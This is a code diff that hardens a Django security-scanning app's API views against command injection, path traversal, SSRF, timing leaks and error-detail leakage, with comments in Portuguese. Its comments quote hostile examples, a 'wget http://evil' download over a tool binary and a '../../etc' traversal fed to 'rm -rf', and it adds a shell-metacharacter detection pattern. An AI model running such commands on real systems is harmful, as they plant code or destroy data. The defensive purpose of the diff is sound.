@@ -1,6 +1,8 @@
 import os
 import re
+import shlex
 import socket
+import hmac
 import logging
 import requests
 import validators
@@ -43,6 +45,47 @@ from celery.exceptions import TimeoutError as CeleryTimeoutError
 
 logger = logging.getLogger(__name__)
 
+
+# Onda 2 (#13) — hardening da execução de comandos de tool vindos do DB.
+# UpdateTool/UninstallTool compõem comandos a partir de campos controlados por admin
+# (update_command / install_command / github_clone_path). Com run_command(shell=True)
+# um metacaractere nesses campos vira RCE por chaining/subshell/redirect; mesmo com
+# shell=False (shlex.split) um segmento hostil pode virar option/path injection. Estes
+# guards rejeitam metacaracteres de shell e validam segmentos de caminho antes de executar.
+_SHELL_META_RE = re.compile(r'[;&|`$(){}<>\n\r]')
+
+def _has_shell_meta(value):
+	"""True se a string contém metacaracteres de shell perigosos (chaining/subshell/redirect)."""
+	return bool(_SHELL_META_RE.search(value or ''))
+
+def _is_safe_path_segment(value):
+	"""Nome/segmento de caminho seguro: alfanumérico + . _ - e sem começar com '-'."""
+	return bool(value) and bool(re.fullmatch(r'[A-Za-z0-9._-]+', value)) and not value.startswith('-')
+
+# Onda 2 (#13, revisão adversarial): allowlist REAL do binário base de um update_command.
+# run_command(shell=False) faz shlex.split, o que neutraliza chaining/subshell — mas NÃO
+# restringe QUAL binário roda: 'wget http://evil -O /go/bin/httpx' (sem metacaractere)
+# ainda executaria. Restringimos argv[0] aos package managers usados pelos tools default
+# + auto-update do próprio binário do tool. Tools custom com outro updater entram aqui.
+ALLOWED_UPDATE_BINARIES = frozenset({'git', 'go', 'pip', 'pip3', 'nuclei', 'subfinder', 'chaos'})
+
+def _update_command_base(update_command):
+	"""basename de argv[0] do update_command (via shlex), ou '' se vazio/inparseável."""
+	try:
+		argv = shlex.split(update_command or '')
+	except ValueError:
+		return ''
+	return os.path.basename(argv[0]) if argv else ''
+
+def _is_contained_tool_path(clone_path):
+	"""True se clone_path (após realpath) é filho DIRETO de /usr/src/github, sem metacaracteres
+	nem traversal — evita que um github_clone_path adulterado ('/usr/src/github/../../etc')
+	vire deleção arbitrária de diretório no `rm -rf`."""
+	if not clone_path or _has_shell_meta(clone_path):
+		return False
+	real = os.path.realpath(clone_path)
+	return os.path.dirname(real) == '/usr/src/github' and bool(os.path.basename(real))
+
 # Bounded timeout for outbound HTTP issued on the synchronous web request path so a
 # slow/unresponsive upstream can't pin a gunicorn/web worker indefinitely (OWASP A04-2).
 WEB_FETCH_TIMEOUT = (10, 30)  # (connect, read) seconds
@@ -81,12 +124,16 @@ class SensorFindingsImport(APIView):
 	O do cert; a nuvem é a autoridade)."""
 	permission_classes = []
 	authentication_classes = []
+	throttle_classes = []  # Onda 2 (#8): ingest máquina-a-máquina isento do throttle global da API
 
 	def post(self, request, *args, **kwargs):
 		from django.conf import settings
 		secret = getattr(settings, 'SURICATOOS_SENSOR_IMPORT_SECRET', '')
 		auth = request.META.get('HTTP_AUTHORIZATION', '')
-		if not secret or auth != f'Bearer {secret}':
+		# Onda 2 (#10): comparação em tempo constante — não vaza o segredo por timing.
+		# Compara em bytes (o header é atacante-controlado; um Authorization não-ASCII
+		# levantaria TypeError no compare_digest sobre str → 401 limpo em vez de 500).
+		if not secret or not hmac.compare_digest(auth.encode('utf-8', 'surrogateescape'), f'Bearer {secret}'.encode('utf-8')):
 			return Response({'error': 'unauthorized'}, status=401)
 		data = request.data or {}
 		tenant = (data.get('tenant') or '').strip()
@@ -322,7 +369,10 @@ class HackerOneProgramViewSet(viewsets.ViewSet):
 		elif str(exc) == "Invalid API credentials":
 			return Response({"error": _("Invalid HackerOne API credentials")}, status=status.HTTP_401_UNAUTHORIZED)
 		else:
-			return Response({"error": str(exc)}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
+			# Onda 2 (#14): loga server-side com traceback; ao cliente vai mensagem genérica
+			# (não vazar paths/stack/internals no corpo do 500).
+			logger.error('Unhandled HackerOne API error', exc_info=exc)
+			return Response({"error": _("An internal error occurred")}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
 
 class InAppNotificationManagerViewSet(viewsets.ModelViewSet):
 	"""
@@ -643,7 +693,10 @@ class WafDetector(APIView):
 			response['message'] = _('Invalid Domain/URL provided!')
 			return Response(response)
 
-		wafw00f_command = f'wafw00f {url}'
+		# Onda 2 (#5 SSRF): -r/--noredirect impede seguir 3xx do alvo p/ 169.254.169.254/interno.
+		# NB: não fecha o DNS-rebind entre o guard e a re-resolução do wafw00f — esse é o
+		# residual #12 (mitigação de infra: egress filtering + IMDSv2), ver security-onda2.md.
+		wafw00f_command = f'wafw00f -r {url}'
 		_unused, output = run_command(wafw00f_command, remove_ansi_sequence=True)
 		regex = r"behind (.*?) WAF"
 		group = re.search(regex, output)
@@ -1405,11 +1458,18 @@ class UninstallTool(APIView):
 
 		if 'go install' in tool.install_command:
 			tool_name = tool.install_command.split('/')[-1].split('@')[0]
+			# Onda 2 (#13): nome derivado do DB — valida o segmento antes de compor o rm.
+			if not _is_safe_path_segment(tool_name):
+				return Response({'status': False, 'message': _('Tool name is invalid; cannot uninstall.')})
 			uninstall_command = 'rm /go/bin/' + tool_name
 		elif 'git clone' in tool.install_command:
-			tool_name = tool.install_command[:-1] if tool.install_command[-1] == '/' else tool.install_command
-			tool_name = tool_name.split('/')[-1]
-			uninstall_command = 'rm -rf ' + tool.github_clone_path
+			# Onda 2 (#13, revisão adversarial): github_clone_path vem do DB. startswith é
+			# driblável por traversal ('/usr/src/github/../../etc' → rm apaga fora do dir);
+			# exige que o realpath seja filho DIRETO de /usr/src/github e usa o caminho
+			# NORMALIZADO no rm.
+			if not _is_contained_tool_path(tool.github_clone_path):
+				return Response({'status': False, 'message': _('Tool path is invalid; cannot uninstall.')})
+			uninstall_command = 'rm -rf ' + os.path.realpath(tool.github_clone_path)
 		else:
 			return Response({'status': False, 'message': _('Cannot uninstall tool!')})
 
@@ -1442,15 +1502,28 @@ class UpdateTool(APIView):
 
 		if not update_command:
 			return Response({'status': False, 'message': _('%(name)s has missing update command! Cannot update the tool.') % {'name': tool.name}})
-		elif update_command == 'git pull':
+		# Onda 2 (#13): update_command vem do DB — rejeita metacaracteres de shell p/ impedir
+		# que um comando adulterado vire RCE por chaining/subshell/redirect.
+		if _has_shell_meta(update_command):
+			return Response({'status': False, 'message': _('Update command contains unsafe characters and was blocked.')})
+		if update_command == 'git pull':
 			tool_name = tool.install_command[:-1] if tool.install_command[-1] == '/' else tool.install_command
 			tool_name = tool_name.split('/')[-1]
-			update_command = 'cd /usr/src/github/' + tool_name + ' && git pull && cd -'
+			if not _is_safe_path_segment(tool_name):
+				return Response({'status': False, 'message': _('Tool path is invalid; cannot update the tool.')})
+			# `git -C <dir> pull` dispensa shell (sem 'cd &&'), então roda com shell=False.
+			update_command = f'git -C /usr/src/github/{tool_name} pull'
 
-		
+		# Allowlist REAL do binário base (ver ALLOWED_UPDATE_BINARIES): shell=False só barra
+		# chaining, não impede rodar um binário arbitrário. Cobre git/go/pip/... e o
+		# auto-update do próprio tool (base == nome do tool).
+		base = _update_command_base(update_command)
+		if base not in ALLOWED_UPDATE_BINARIES and base != (tool.name or '').lower():
+			return Response({'status': False, 'message': _('Update command not allowed: base binary %(b)s is not in the allowlist.') % {'b': base or '?'}})
+
 		try:
-			run_command(update_command, shell=True)
-			run_command.apply_async(args=[update_command], kwargs={'shell': True})
+			run_command(update_command)
+			run_command.apply_async(args=[update_command])
 			return Response({'status': True, 'message': _('%(name)s updated successfully.') % {'name': tool.name}})
 		except Exception as e:
 			logger.error(str(e))
@@ -1658,7 +1731,9 @@ class CMSDetector(APIView):
 		try:
 			response = {}
 			cms_detector_command = f'python3 /usr/src/github/CMSeeK/cmseek.py'
-			cms_detector_command += ' --random-agent --batch --follow-redirect'
+			# Onda 2 (#5 SSRF): sem --follow-redirect. CMSeeK reflete o conteúdo buscado na
+			# resposta da API, então seguir 3xx→metadata/interno seria SSRF com exfiltração.
+			cms_detector_command += ' --random-agent --batch'
 			cms_detector_command += f' -u {url}'
 
 			_unused, output = run_command(cms_detector_command, remove_ansi_sequence=True)
